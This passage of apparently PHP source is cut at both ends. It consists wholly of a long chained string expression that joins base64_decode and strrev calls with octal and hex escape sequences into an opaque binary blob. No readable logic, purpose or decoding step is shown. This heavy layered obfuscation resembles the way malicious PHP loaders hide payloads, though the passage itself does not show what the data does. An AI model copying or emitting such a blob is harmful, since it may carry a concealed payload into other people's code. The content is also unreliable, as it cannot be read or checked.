Ë&ò§…5Iklº/X?\'†≠'."\r".'æa©®').base64_decode('lK1Z07NNgG6Q74PVonaWSOij6yUpDKGL0LuKrp8793Z3zQX/VBLiFyVNSyuZTA==').base64_decode('TBlSyLrKJqcatK9uI67m3ACCo/5gLC0b6bbk1BgqRWlqUhly5dN5svTZao9a8A==')."\36\316\116\273\146\372\4\312\234\321\22\162\106\354\51\16\247\115\63\37\126\162\111\70\40\244\107\332\140\16\15\130\136\121\110\246\46\207\224\224\332\244\205\122\153\235"."\132\147\320\202\331\14\13\321\336\61\230\301\200\346\20\301\230\62\22\127\206\114\62\50\322\254\104\132\326\301\164\325\27\314\224\163\6\241\57\371\174\106\115\310\246\252"."\345\334\132\302\124\114\247\141\352\212\114\152\363\44\22\212\141\70\275\132\316\324\265\214\323\223\311\150\203\316\240\256\366\250\271\72\151\22\241\306\40\21\254\167\47\244"."\x90\x75\x64\x11\x97\xcd\x92\x20\xae\x40\x2\x31\x9\x7f\x8d\x2e\x4e\x96\x5b\x97\x73\x46\x4a\xd1\x9d\x3e\xb2\x68\xea\x24\x30\x1f\x8c\x40\xd2\x6c\x4d\xaa\x91\xd7\xc\x15\x36\xaf\x4e\x92"."\x4d\x53\x4e\xa4\x21\x71\xe1\xd5\xd7\xff\x48\x7e\x35\x97\x51\x73\x4a\x51\x5e\xdf\x50\x5e\xd5\x15\x83\xb6\x55\x6a\x69\x8b\x90\x4a\x40\xed\x8a\xb3\x43\x97\x7b\xb2\x72\x9d\x94\x2f\xc4\xc1".base64_decode('yJDVWwKGc5OhqZMSMOqQsgXDdOoKoFIq2A/JHPtTzja4tFQl6QwDYk7AU6pqJQ==')."\x80\x36\x12\x4d\xc3\xd0\xd6\x48\xa4\x23\xe6\x6f\x6\x7b\x76\xbb\x2f\xd6\xe6\x89\x78\x5b\x49\xb3\x4d\xb9\x87\xb6\x39\x0\x48\x34\xab\x92\x2\x17\x38\xc1\x12\x83\x88\xd5\xe\xfa\xca\x81"."\x1d\xda\xa0\xa2\x83\xf\x37\xe\xd7\x49\x7d\x5a\x32\xae\xd\xb9\x68\x12\xcc\x1c\x6\x34\x84\x66\x86\xd3\x9d\x37\x9d\x21\x39\xd7\x3\xc7\x27\x3e\x6c\x2a\x4\xfd\x8c\x81\x1e\xeb\x40\x7"."\x94\x5c\x8f\x99\xa6\x5\xc3\xbe\xd0\xd9\xbe\x50\x2c\x1c\x6c\x8e\xcc\xf7\x84\xc8\x6e\x9f\x3\x58\x32\x44\x3f\x5\xab\xce\x38\x43\x4a\x12\xc\x7d\xc2\xa4\xe5\xe4\x3c\x1c\x35\x9a\x7\x2e"."\14\70\127\64\25\56\26\232\26\360\267\300\201\151\162\32\40\223\123\314\105\353\16\250\131\25\266\335\144\51\150\44\1\53\320\102\32\344\106\35\252\217\246\47\125\104"."\223\223\53\235\340\337\111\225\135\321\46\327\244\356\6\267\312\313\270\253\135\325\122\115\325\64\251\3\360\46\252\234\221\110\247\213\162\124\111\301\171\77\62\0\160\353"."\x12\x96\xb5\x6d\xe8\x30\x30\xe4\x3b\xab\xd3\x17\x8e\xc4\xda\x7c\x91\xd6\x60\x13\xf9\x82\xcf\x43\x42\x1\xd\x2f\x4d\xda\xa3\x2e\xfc\xd3\xed\xe2\xf4\x18\xcc\xb9\x3f\x2b\xf7\xd8\xa8\x34"."\214\265\151\272\142\205\360\135\143\276\232\244\144\34\106\133\25\265\47\115\372\247\302\332\22\132\106\323\345\14\244\142\24\211\25\112\131\172\324\24\231\37\114\60\171\44".strrev('nS+-I√\'?ÓÃ•3MbqínuBNöomçi/nõÊ'."\n".'[).6BÈôÆîÛf¨')."\x17\x91\x24\x25\x89\x69\x12\x6\x4d\xb2\xa4\xb4\x2a\x32\xdf\x2f\x4d\xdd\xd4\x20\x54\xb7\x64\x69\x53\xcc\xb4\x46\x26\xa9\x47\xa1\x4d\x2a\xb0\xb6\xd1\x56\x26\x95\x8c\x42\x47\x23\xad\x50"."\x92\x5e\x45\xb2\x81\x9d\x89\x8d\x55\x8a\x91\x77\xc0\xb8\x1\x28\xdf\x52\x55\x23\x4\x4a\x42\x46\x8a\xc6\xe7\x43\x7e\x97\x3\x4c\x96\x35\x3\x76\x93\x60\xbc\x17\x2c\x17\xc2\x49\xa8\x46"."\263\260\371\307\64\224\6\32\57\363\374\35\272\222\122\311\242\313\201\31\153\223\365\76\132\0\314\20\337\166\140\104\250\254\271\63\20\210\171\203\355\21\300\103\143\310"."\374\220\77\342\243\70\352\151\212\171\274\35\154\23\345\63\116\62\100\202\121\274\33\140\310\100\215\260\23\361\55\213\23\163\272\325\102\142\215\303\200\72\347\265\234\241"."\x38\x13\xa4\xb6\x24\x27\xeb\x38\xc7\x2c\x1b\x4d\x2f\x2a\xc1\x39\xf7\x21\xa7\x9c\x5d\xec\xcc\x82\x61\x72\xb2\xa6\x5b\x77\x58\x29\x22\x6e\xd4\x7e\x32\xaf\x9c\x7c\xc3\x81\x5\x82\x11\xdd"."\332\73\202\141\122\240\1\102\1\367\24\127\164\322\216\216\116\222\224\25\160\252\305\107\200\207\321\335\132\46\274\223\147\176\230\222\336\2\310\257\253\213\145\336\307\6"."\332\36\122\367\120\66\303\31\102\153\257\234\174\56\42\255\376\366\171\261\266\140\223\57\20\363\267\3\272\24\51\206\167\166\64\171\350\344\212\360\306\140\244\325\2\355".base64_decode('BJTpbE/Ab8/uW+APR8IlkwCs02dLAbJgR8jX7F/Aos1+X6ApHPN6vK08T7unjQ==')."\x44\x62\x29\x28\x8d\x19\x6e\x6b\xfe\x18\x20\xb1\x61\x26\xd3\xc5\x6\xa0\x7c\x4a\x7\x2b\x66\x11\xa0\x62\x54\x34\x88\x71\x3c\x0\xdb\xa5\x42\x70\x8f\x74\x17\x4a\xc5\xa8\x27\x84\x47\x4f".strrev('Aj/πóﬂ$!Ä„A∫à,√‚?F1Û2XO%*ÅXVÈí≤…ïí™RÃMåçäh').strrev('<ÖÏ7—qIÕ°‚ºÄ3ZËƒå–'."\0".'ﬂâÄÃ'."\r".'<X8∂£&RxóråRTiÊ').base64_decode('UHCOzQ8F21tIgcG0QhvgJ8NfQdknIj+bnIQB3kemIhQf9F6NDuVS/HMG/gFsHw==').strrev('vFñÈì>%…"É^Ô$¿z0¿SÆÜZkã_`V±)@’Å*ú‘á££í∏˘')."\224\110\160\236\257\75\106\61\13\307\4\154\304\0\40\313\6\103\144\100\114\255\217\12\124\70\61\344\13\323\125\256\53\375\5\225\16\227\333\65\231\140\261\2\66\55"."\xf2\x79\xf7\xb9\xd1\xc1\xc9\x15\x5d\xce\xc9\xae\x6e\x10\xa8\x9c\x34\x17\x47\x49\x2c\xea\xb2\x44\x27\x90\xf2\x5\x9d\x95\x86\x8c\x51\x85\xd1\x50\x59\x17\x75\x47\xdd\x15\xd\x75\x5d\x1e"."\xe7\x62\xd9\xb9\xb8\xca\x39\xd3\xd9\x3d\x39\xea\xaa\x9c\x4c\x0\xdd\x4b\x6a\x1c\xb5\xcb\x60\x6\x90\xb1\xe1\xf4\x6e\xf0\x53\x1f\x6d\x98\x18\x75\x9e\x71\xde\xa2\xb9\x5d\xd1\xee\xf2\xba"."\311\343\243\256\323\243\203\335\223\52\33\350\167\22\5\35\10\213\211\141\326\324\344\344\12\320\44\300\60\261\54\71\104\362\204\14\64\141\261\232\347\320\45\323\226\121"."\x38\x98\x43\xa5\x87\x97\xe8\x72\x46\x27\x77\x37\x8\xe5\x4\x90\xfd\x5b\x80\x59\x2\xf4\x37\xcd\xf2\x79\x9c\xe7\xc0\x9e\xb1\xa2\x70\xdd\x13\xfc\x28\xe4\x12\x9c\x7a\xc2\x75\x11\x97\x13"."\x84\xe\xa8\x3d\x39\xb6\x84\x0\x17\xc0\x84\x74\x2b\x9f\xbe\x64\x22\xfe\x5d\x46\x27\xb2\x47\x19\xa2\xa4\x21\x97\x52\x75\x82\x9d\x85\x9c\xda\x4f\xcf\x20\x72\x4a\x3f\x9\x68\x26\xc5\xef"."\270\142\16\52\24\75\0\334\22\7\310\101\5\103\220\44\304\62\210\55\44\137\340\2\232\202\244\25\322\213\174\14\362\144\203\54\226\124\162\144\236\16\45\271\215\204"."\x9c\x57\xc2\x42\xf\x63\xb1\x88\xa7\x31\xe0\x8b\x51\xa\x43\x28\x31\x8d\x23\xaa\xd8\xc8\x4e\xed\x40\xd7\x38\x45\xa5\xf4\x21\xc1\x99\x74\x24\x8f\x90\x95\x6f\xf4\x67\x24\x44\x18\x24\x45"."\xd7\x35\xbd\xe\x9d\x4e\x1a\x85\x3c\x64\xe6\x80\xec\x65\x82\xb1\x95\x80\xe0\x2e\xd5\xcf\x91\xf0\x90\x93\x72\x31\x71\x2\xf2\x32\xe5\x1c\xa0\x2c\x2d\x70\x3\x90\x42\x91\x36\xe5\xf9\xc"."\x19\x80\x5\xa3\xfc\x90\xbb\x22\x1a\x2d\x74\x29\xc9\xee\x2e\x80\xf8\xb2\x33\xd5\xbd\x64\xca\xb2\x4a\xca\xc7\xbb\xa3\xe0\xf\x8d\x78\x4a\x1c\xa2\xc5\x18\x35\x8c\x81\xfd\xd9\x5\xdb\xc1".strrev('∞ù¥‰DÉ8\\≠¡bú∂xG&„tM%@à™XŒS56ÌÖº¶òŒö£åñ,AŒ')."\261\3\20\341\370\13\226\10\53\246\213\345\160\10\211\370\337\372\62\112\341\163\140\15\171\205\375\15\37\332\204\207\15\123\311\132\316\51\15\105\326\23\351\346\102\46"."\x63\x32\x8e\x3f\xa3\xf6\x91\x6a\xc9\x2\x59\x54\x2a\x6f\xb3\xa6\x53\xc9\x76\x12\xf9\x6e\xd9\xa4\x52\x19\xfd\xb9\x1c\x90\x43\x45\x84\xe2\x5b\x69\x8b\x7\x30\x2d\x11\xa9\x82\x9e\xe9\x49"."\xfe\x76\xa9\x31\x18\xc\xf8\x3c\xed\x12\xdc\xb5\xc9\x6e\x3\x58\x82\xb0\xaf\xc3\x3\xb6\x2a\x28\x23\x87\x23\x3e\x72\xcc\xe8\x6f\x72\xd2\x7a\x17\x38\xfd\x44\x8a\x62\x1\x35\x49\x27\x7"."\x50\x38\x93\x42\xc9\x29\x17\x89\x41\xa6\xd2\x1\xf\x74\x1c\x90\x75\x70\x80\xe6\x3a\xa0\x84\xe4\xe0\x8c\xbc\x83\x1f\x93\x39\x18\x1b\xed\x20\xdc\xb5\xc3\x94\x75\xb0\xf1\x43\xf6\x97\x4"."\xfd\x4d\xe\xd5\x68\x42\xa2\x3\xaa\x17\x25\xd1\x76\x98\x69\x78\x62\x91\x91\x87\x1d\xb8\x4d\x1\x65\x40\xc9\x38\x68\x8b\x1c\xb4\xa1\xe\xca\xfa\x3b\x90\x28\xd7\x44\x5a\xd3\x9\x16\x9"."\151\15\12\2\132\230\166\100\264\200\130\351\340\247\167\344\163\202\254\341\340\162\210\243\107\327\12\371\16\372\45\41\206\33\103\0\274\245\14\20\322\64\323\101\145\113".base64_decode('R7HYWXrISjcdjbH922R+YFLxkJSuvXjMrVLTElwRkb6X0f3JkodPIV09GYXH4A==').base64_decode('IPPQ2XzJwX40ywMiUpVCMLpLUGTkp+j8kJdzrXb50X5ECz8akXvCwudMuYd+qw==').base64_decode('RCoOh5TEcILLoE2CZGuNsXFH66IUcpeeT4awbB4OO/RQOpAUi9lcWpB/1NXG+w==')."\x14\xcc\xf3\x8d\x1e\x92\xd6\x30\xd8\x72\x4\xe2\x49\x41\x41\x4e\xab\xb\x84\x31\x91\xd\x22\x22\xc0\x73\x57\x12\x52\x28\x8c\x77\x45\x1c\x6c\xd4\x1f\x3b\x80\x8e\x8e\xe5\xbb\x30\xca\x11".base64_decode('hQ6BBD/gELZSuEqcfMqFKPlRtRge91iWSfdsImyEHs5Lh5obVnPi6QuH8r2Cbw==').strrev('≥¨Å;ßH0Jr÷…©;hTXz–££∞üz‚'."\0".'„Ír;ß‰-1Ö£MEÁmqU').base64_decode('IS5B2bSs8zGlKwyiOT/Tgll4VMiWkgf4NmopI6wTwxymrReD1kpxtGm0SCsTwQ==').base64_decode('S0XFJagaATB2pcKopxGtZBQeDNGwhvCf3tNadjMkxFZQGNkuY4Joy1amtRxuoA==')."\207\21\67\300\167\146\0\45\327\135\160\61\265\100\302\54\22\107\106\314\14\270\11\220\32\20\63\41\56\115\214\263\141\5\254\53\222\207\327\37\56\112\23\163\363\203".base64_decode('DkgKOemkc8FXKp8fviwtqNTD214AOWLFjYLLoXS8WdcYP8c2QHsmLxKYTHEyhA==')."\xdd\x4b\x18\x3a\xcb\x46\x5b\x4\x12\xca\xd8\xb7\x5c\x1b\xd4\x16\xe5\x33\x60\x21\xd6\x18\x44\x8f\x53\xe5\x64\x56\xcd\xb9\x74\x4c\xf6\x5d\x80\xd\x26\x17\xa3\x8e\x2a\x81\x17\xe1\xb4\x6b"."\x89\x81\x26\x93\x6c\x13\xcb\x6c\x28\x61\x2\x91\x3b\x2e\xeb\x2e\x1d\x7c\x99\x37\x88\x70\xb6\x5\x36\xd\xdd\xa4\x55\xa8\x2a\x9e\x4f\x20\x9f\x28\x25\xa0\x51\x29\xd\x52\x4\x5f\x52\x35"."\x21\x4\x12\x7c\x8d\x9e\xc1\xf2\x8c\xc2\xe5\x24\x83\x89\xf4\x18\xe\x80\xab\x68\x12\x38\x3\xeb\x98\x68\xc9\x59\x6a\xb3\x73\x4d\x42\xfb\x93\x8b\x6f\xc7\xe2\x66\x2e\xde\xbf\xc2\x1b\x5c"."\x1c\x12\x94\x16\xb2\xec\x4a\x17\x1\x5d\x86\xa9\xe5\x79\x8a\x10\xc5\xc9\x42\x12\xaf\x54\xc8\xc5\x6\x1d\xb5\x9\xa0\x7d\x12\x31\x71\x7c\xd0\x50\x5e\x52\x16\x49\x73\x78\x65\xb9\x32\x20"."\x87\x70\x4f\xe0\x6f\xf2\xe8\x3a\x45\x25\xdc\x21\x78\x74\xc\x80\x22\x8\x52\xad\x30\x5d\x7\xa5\xb6\x21\x5c\xb9\x6f\x80\x2b\x23\xe0\xaa\xe0\x87\x5d\x78\x55\xba\xe4\x64\x32\x48\x8f\x72".base64_decode('xXBxVvFkq3RFSD+EVSXESmf3ZDL81tgeH7UIXoBiIREyarFmJFXR651SMMZ4iw==')."\xec\xa5\x95\x9d\xe4\x77\xf8\x76\xb6\xd3\x4a\x69\x47\xe7\x4d\x46\x21\x3c\x7c\x42\x4b\xc7\xc1\x3e\xee\x4d\xab\x39\xc5\x60\xdb\xb1\x6e\x94\xe8\x31\xc4\xcc\xd1\xa6\x9\xa6\x9\x67\x8f\x40"."\274\6\0\161\247\143\7\154\234\50\10\233\71\332\30\143\246\205\15\11\241\72\4\124\265\214\76\130\32\170\44\41\141\366\7\1\352\227\306\7\173\76\205\36\61\42".strrev('tø‡rhEK\'£aæ·√o€ª‚˝<∑ÉÄﬂn∑ã∆ÁÜqUfM\'Vå√»?ò(Íñ§3'."\n".'')."\177\364\57\12\163\205\260\145\13\166\347\76\172\356\270\203\136\375\351\133\177\273\162\305\111\152\345\356\167\315\53\156\50\74\260\343\6\147\327\265\233\126\267\75\370\207"."\253\117\136\376\333\326\261\276\261\316\55\357\64\134\361\360\226\221\226\345\307\266\375\374\327\351\77\37\344\374\323\176\331\215\373\236\63\41\175\301\123\155\233\6\336\275"."\xc3\xfb\xca\xaa\xf1\x95\xcf\xef\x7b\x44\xdf\xc8\x4b\x9f\x45\x9f\x32\x4e\x3f\xf7\x5f\x63\xab\xbf\xb8\xee\xb4\xd9\xc3\xbb\xb6\xcc\xf3\xed\xf5\xee\xff\xf6\x8e\x3b\xdf\x5a\xd7\x9f\x7b\xfd"."\xc4\xe3\xfe\x16\x9\xb4\xaf\xaa\x6b\xf2\xbe\x72\xc8\x1f\x4f\x3f\xf9\xd5\x3b\x2e\x69\x3b\xfa\x99\xf\xf6\x84\x9f\xdf\x70\x62\x67\xe4\xec\xfc\x75\xe1\xc6\x13\x3b\x3e\xbc\xfa\xc0\xb1\xff".base64_decode('PPm7vRVf/XPb4B3rbjtp68S9/6l68IPrL7tm5cktKxpPvju1fdetD897IVAz5w==')."\266\345\157\352\57\75\144\366\36\263\341\345\366\147\313\152\326\155\273\373\272\27\356\174\106\156\362\113\377\174\141\343\344\167\33\116\35\263\337\247\107\57\137\173\321\330"."\113\326\126\275\272\355\330\225\7\355\173\316\272\65\211\335\63\346\345\373\253\66\357\362\115\270\166\366\266\334\163\107\334\371\371\237\373\7\147\237\165\125\313\262\366\107"."\23\113\16\72\367\370\145\133\237\76\375\275\33\264\7\74\357\137\167\124\344\204\367\327\175\122\266\276\153\375\365\137\277\62\353\314\65\227\37\266\363\336\337\337\371\213"."\x77\xcf\x7a\xef\x9d\x8b\x66\xbd\xdf\x33\x30\xf2\xf2\xea\xe6\xb5\x97\x3c\xfc\xe2\xa2\xf\xdf\xfa\xdb\x83\x63\x1e\xc\xb9\x56\x9d\x51\x95\x5c\xf4\xda\x37\x8b\x9e\x6c\xf8\xf4\x8b\xdf\xd"."\xed\xb7\x3e\x7b\xd7\x85\x7b\xbf\xf8\xd9\x55\x83\x7\x3d\xfb\xd9\x1b\x73\x5f\xbe\x56\x7f\xfc\xb6\xae\x91\x85\xf\xfe\x66\xfe\x43\x75\x6f\xcc\xd8\xdc\x7d\x51\xea\xb1\xb3\x9a\xcf\xd9\xf4"."\326\76\175\217\17\375\274\377\235\216\23\117\314\217\274\174\333\335\353\246\176\322\265\174\354\121\253\335\113\317\171\265\177\355\372\233\176\246\177\362\130\173\170\335\55\57".strrev(':^;Ω#˛nª”9Ô´Ω+$Ωïi˘{ÁiûÚŸ˛¨©_kEµ-Ìkºœı¡ˆŸü')."\357\322\252\331\53\117\357\176\176\174\305\333\146\360\256\324\61\211\61\177\131\275\160\302\117\277\373\343\63\143\325\77\16\374\152\305\115\306\51\273\306\355\276\344\216\175"."\x7a\x6e\xf3\x1e\x7c\x6f\xfe\x99\x35\xe7\xfe\xe1\x71\xdf\x37\xef\xf7\x1e\x79\xd2\xc0\x71\x27\x8c\x9b\x7c\xc6\xa7\xef\xf4\x7c\xb1\xcf\x85\x2b\xe7\x8f\xdf\xfc\x79\x95\x7c\xca\x82\xe7\xf6"."\171\277\152\141\335\134\327\53\257\314\232\361\372\346\115\333\322\135\13\176\361\320\304\277\376\243\252\352\310\375\17\122\117\371\374\213\263\306\271\132\27\135\131\166\360\303"."\217\156\273\142\156\162\365\276\33\216\334\340\32\367\207\245\265\233\367\57\253\357\274\172\333\25\123\316\374\41\363\322\307\273\37\123\273\322\327\4\7\327\35\376\152\365".base64_decode('AVM2f1k9cM1ngbOf+qLs2Yc2XX7xxWZ4pHHvZUfdclhg/ysvfeof/sMPHGr8pg==').strrev('ÊwöÌπ?Ç˜Œ≠Q‹w≤r‘⁄Ø7á≈˝\'ºcCÎˇ_◊‚˙πoßó5˝˛ü‹´').base64_decode('Hvtt6zNPHjmS/GDmASdclXn6s23bnmg/ddt9zrv3vWVg0Y66iz/b1P7SrSOpUw==')."\345\145\153\147\55\374\362\301\355\17\137\170\315\41\47\34\277\260\52\371\341\317\77\173\371\253\353\227\335\171\313\237\243\117\336\176\326\65\277\362\17\114\330\161\124\325"."\165\237\176\376\370\234\356\145\157\116\235\325\377\352\202\203\173\173\317\155\117\234\70\161\367\236\145\207\76\163\165\323\317\127\76\277\340\310\11\333\247\134\137\375\353\7"."\x2e\xbe\xcf\x7d\xc4\xa7\x3f\x3c\x7b\x6f\xe5\xb3\x17\x4c\xce\x6e\x6c\xe\xc\xee\xfe\xc3\x94\xcf\x2a\x33\xbf\xbf\xfe\xaf\xef\x9a\x47\xb8\x94\x3b\x5e\xd8\x72\xca\xce\xc4\x65\x15\x8f\x9d"."\276\246\265\142\140\277\233\16\135\45\153\267\155\367\237\263\337\342\71\201\170\373\254\147\367\227\37\76\105\71\71\271\154\145\174\352\151\347\64\65\365\165\66\137\362\365".base64_decode('DSfse+uaCXcoQx8+VnPMd9d+ajybGmg77egLJt//4Dsnfvv2J3LfxtWdV/3skA==')."\xbb\x6e\xfb\x40\x4a\x6e\x30\x37\x4d\x99\xf3\x66\xc7\x65\x7d\xc7\x1d\xb7\xe4\xf1\x23\x2\x9f\xaa\xf\xdf\xf3\xf7\x55\x13\x6\x27\x6c\x9e\x37\xb9\xe5\x3d\xdf\x9a\xc2\x8a\xab\xef\x18\x3f".base64_decode('9/Y1G6NbXhp/3O8PvnH2jAe3vH73xvzKT6b+pP+IXZ/n773F2R0/deG1v9jmeg==').strrev('¡‡<.Î¡„nOj…ﬂÉ€˛ÿj˝É∫áÀˇüO=òœCcUg ¯&+ë\'Â')."\152\347\107\177\77\103\77\376\353\23\137\175\350\260\346\135\7\235\341\70\366\247\37\14\276\76\315\377\227\355\133\346\236\260\245\276\372\236\143\76\320\373\267\64\257\255"."\x6d\xdc\x7e\x6b\xed\xd2\xff\xdc\x7c\xf8\xa4\xc3\x2e\x1a\xba\xf5\x96\x17\xc7\x1a\xeb\xf7\x9e\xf0\xab\x91\xab\xbb\x95\xf7\xb7\xfd\x7e\xd2\xbc\x47\x3e\xac\x7a\xfb\xd6\xeb\x5b\x9e\xd9\x37"."\xfd\xf0\xd5\x9b\x86\x97\x4a\x47\x6c\xbf\x78\xe2\xbd\xc9\x69\xc7\x8e\x51\x3e\x7f\xe9\x8e\x4b\xf6\xd\x9d\x3e\x6f\xfc\xa6\xdd\x47\x6f\xb8\xfb\x98\xf3\x37\x4f\xf2\x5e\x71\xfc\x47\x17\xbc".base64_decode('dPgxza/dus099VdTd405eMxj3//16MN/cuyu6af846OvBpcUnl3vi55819aTbg==').base64_decode('7A78edmTyzed8cPtTvWbJx7+dNl/QjtTD8SXVh354tyjr79pzMH73jgpUVix+Q==').base64_decode('kxs2xmu33/DqdQsHzkrMW3v4I/mjrn5feXTORl/VV/+OnDjthC+m77ti7Yc3Rg==')."\147\176\360\247\355\173\276\177\166\345\342\127\117\131\241\74\160\302\242\143\16\336\357\375\47\256\333\262\246\356\223\157\36\277\363\363\103\146\334\177\365\316\313\365\365\347"."\x57\xdd\x5e\x75\x7e\xe4\xed\x27\xee\xbd\xf0\xc2\xcf\xa5\x2b\x66\xed\xf3\xe4\x95\x33\xc6\xca\x63\x5e\x98\x73\xcb\xda\x5\x4b\x4e\x58\xf5\xed\xb9\x4e\x6d\xd7\xd8\xcb\xe7\x5e\xf4\xf2\xf3"."\33\336\233\336\361\374\214\207\122\133\342\153\77\234\173\355\73\255\157\75\265\265\162\117\345\252\33\176\173\142\357\270\61\137\356\367\323\233\347\377\160\322\227\133\7\207"."\x3d\xb5\x97\xfd\xe2\xdd\x43\x7a\xf2\xfa\x85\x9d\x27\x7d\x9c\xbb\xe4\x1e\x6f\x99\xfe\xb3\xb3\x52\xc1\x9b\x26\x8f\xf4\x6d\xd8\xf3\xdd\xa6\xf9\x85\x3b\x9f\xec\x5c\xf7\xee\xbb\xdb\x96\x66"."\x3f\x9a\xfa\xc1\xb6\xc3\x23\xef\xd4\x9c\x74\x4e\xf7\xeb\x8f\xce\xfe\xeb\xc0\xb6\x7b\xdf\xbc\xf5\xb8\xfb\x6e\x98\xe7\x3e\xef\xeb\x4f\x37\x9f\x76\xfe\x79\x5f\x7f\x17\xdb\x70\x7b\xc3\xa6"."\37\366\274\246\65\354\335\376\311\167\173\246\157\270\375\374\302\227\273\32\134\357\176\277\175\163\317\371\217\375\360\217\75\133\337\373\117\74\173\332\270\357\117\331\373\352".base64_decode('Ew1vXDCrYcukrjb56tf2Kx8zdkBvvfhPkX9UKXurdz+Xv+DZnQetn7/7ht4Dbw==')."\372\112\16\134\65\71\326\276\374\212\150\365\35\107\355\275\163\237\243\74\316\343\257\333\376\351\311\217\315\173\43\370\361\277\316\176\154\370\316\153\152\17\336\365\340\214"."\xcf\x73\x13\xae\x32\x43\xbb\x7f\xf3\xe5\xd6\xe5\xcd\x57\x1c\xf0\xcd\xcc\x57\x1e\x3a\xfa\xfe\x5b\xe\xca\x6d\xd9\xf8\x7a\x43\xc7\x57\xa7\xee\xfb\xc4\xad\x8e\x6b\xfa\xf6\xfc\x73\xc1\x76".base64_decode('5YQ/vNZ4xUNXjjv67/XP3vp0eCiR2PPlyO5H/nKGeVLqsY1fDyX2fPPvTe8++g==').strrev(';ﬁéõ€)ûˆ{Ø.ˆ^=øù˙◊ÛwªéO‘˜>«[ûÛ?èÎIÕ{°¸◊äÌZ').base64_decode('vq365mb3mZcd8/AxbRfc+8Ojf7vkgPghbXddfHT6ojebZ3aWf3PW+C3HLoqtkQ==')."\276\252\337\135\265\374\304\7\225\3\276\332\166\173\333\363\307\36\370\314\364\217\237\367\214\157\373\327\335\265\173\356\132\170\135\354\332\177\214\363\235\75\167\351\364\314".base64_decode('oR+9+O3lj86vOP6uGSNvPrrtLwu+uOHbCWvGXX9r9oaMe7Xvs/v//uub3j5VqQ==').base64_decode('O8hbsfHfT16z9sKK84xNJ27pfHhStHvd5H+t/+iVYPuFiv+EI8uyaw4+suudlg==')."\xfa\xec\x86\x85\xcf\x6c\xdd\x73\xf0\x47\x1f\xdf\xbd\xec\xb7\xe\xed\xc8\x6f\x5f\xd9\x7d\xdc\xfc\xd5\xd3\xcf\xb8\x50\xfe\xfe\xee\xbb\xe\xa8\xdf\xb9\x60\xcd\x91\xa7\xde\x78\xd8\xe7\x4b"."\x1f\xb8\xf5\xaa\x81\xc7\x8f\xf9\xcb\xdf\xbf\xa9\x1b\xeb\x7a\xa9\x6f\xf9\x23\x8f\x74\xbd\x73\xc2\x2a\xd3\xfc\xc3\x7b\xab\x5c\x65\x2d\xd3\x4f\xea\x8c\x1c\xbd\xea\xe9\x2f\x3f\x19\xf9\x6c"."\x45\xea\xae\xf2\xf1\x2b\xae\xb9\xe7\xb9\x2d\xe3\xdc\xeb\x5e\xec\x3d\xef\xd0\x23\xaf\x8\xdd\x3f\x71\xde\x8d\x37\x56\x2c\x79\xcb\x58\xf7\x4e\xeb\x84\xc3\x26\xbf\xb1\xff\xe6\xa9\x53\x9e"."\176\341\116\351\336\213\257\371\164\277\267\227\256\75\352\315\65\15\217\157\156\254\273\360\250\345\123\215\235\307\336\266\246\343\310\114\54\172\374\260\277\162\331\367\143\52"."\x7e\xf6\xfe\xe6\x47\xb5\x2b\x4f\xda\x7e\xcc\xaf\x3b\xfb\xef\x39\x6a\x4a\xb2\xa3\xef\x91\x67\x8c\xcb\x77\xfe\xe6\x32\xf5\xc5\xa6\xdf\x2e\xaa\x39\xf0\xfb\x8a\x9b\xd7\xbe\xb4\xf1\x93\x5a".base64_decode('6dVHz7n+syfGLphYvvLxD8xLbzv3hZqtY4w9E86rbz18zPNzz5v80dTDM+7shg==')."\xe3\x2e\x5f\xa0\xde\xff\xa1\x6b\xca\xe9\xff\xba\xb9\x70\x53\x5d\xe0\xeb\x5f\xbd\xb3\xe2\xfb\xc8\x8c\x4f\x2f\x7d\xf6\xca\x71\xd1\x5f\xad\xd9\xf9\xc2\x55\x67\x6a\x17\xc4\x3f\xfc\x65\xf5"."\347\143\175\347\44\224\201\367\202\177\373\115\303\327\333\277\135\265\373\27\15\137\204\216\175\156\306\336\133\117\270\354\366\265\343\236\37\330\177\326\315\43\263\217\31\176"."\x61\xe1\xc5\x3\xb\x92\x37\x7f\xb9\x31\x77\xc3\x33\xd1\x9b\x56\x78\x42\x5f\x37\xde\xf1\xca\xd2\x9e\x33\xbb\x9f\x5a\xb1\xa0\x6a\xdf\x67\x2f\x7f\xe6\xec\xe3\xdf\x9d\x78\x6d\xd3\x19\xbb".base64_decode('tm2cO+2Tcx66883ZvRVL/r357VkvfveT7Jzld3h1fWP9sq4v77k782bwm2/OuQ==').base64_decode('1Oj584TewW2rv1//UM3CQ6sb1p905KZTjOGx7wdnr4m+tem9XVNPemT6aQ2XnA==')."\x38\x7e\xf3\xd3\xeb\x7d\xf\x27\xee\xde\x73\xc8\xc1\xf7\x4c\xfd\xe1\xd2\x35\xa7\x7b\xaf\xce\xde\x17\x39\xad\x47\xbf\x5a\x4a\x9e\x78\xe9\x8d\x97\x9d\xfe\xc3\x60\xc5\x1f\x46\x9e\xbe\xf4".strrev('øZÕ©oñ‹˛ß˝=˚5ﬂ`f±|ÆﬂÈ≈y6<>Z„ùå›Ú\\kûÙ}‘_o÷ªá')."\365\230\17\357\273\44\351\373\364\342\314\123\23\367\277\343\220\337\373\357\271\376\212\107\313\156\272\145\332\100\162\305\265\347\235\47\37\165\314\51\317\354\170\376\374\363"."\xbf\xfc\xf4\x9e\x9f\x3e\xfd\xef\xf\x3f\xd9\x1a\x3b\xf7\xc9\xff\x7c\xbd\xf9\xfc\xf3\x8d\x2f\x7f\x77\xe9\x4d\xa7\xcd\x5e\xf2\xe5\xa5\xe7\x9f\xf7\xfd\x96\x96\x9f\xfe\xf1\xa9\x2b\xf\x5f"."\x7b\xcf\x5d\xa7\xc5\xf6\xee\x5e\xfd\xcf\xbf\xaf\x6e\xe8\x3e\x6f\xef\xae\x1d\x2d\x7f\xef\xfe\xe1\x5f\x83\x3f\x3d\xed\xa9\xf3\xbf\xfb\xfa\xbd\xfb\xf6\xfe\xfb\xad\xff\xec\xdd\x73\xa0\xfb".base64_decode('tl/G9XUnDm5Y+tXxk+taHCffu7xs/ruPL9l93P21u5PGy3+arB36k5NX/bLr7Q==')."\317\332\37\171\344\301\267\337\173\242\141\133\303\270\123\117\135\361\334\165\37\135\167\360\221\357\235\167\121\355\73\317\214\274\276\61\330\263\162\367\117\316\77\365\242\332".base64_decode('ui7H/J1nqvdE173xyYrUB58f6elbNNi6/9U/TFztOHXrVa9u3BX859Y3rv/T1w==')."\x3b\x5f\x7c\xe9\x28\xf7\x11\x99\xd7\x57\x4f\x3d\xe0\xc6\xd5\xd5\x6f\xfc\x6e\xcc\xe6\xab\xbc\x2f\x4\xa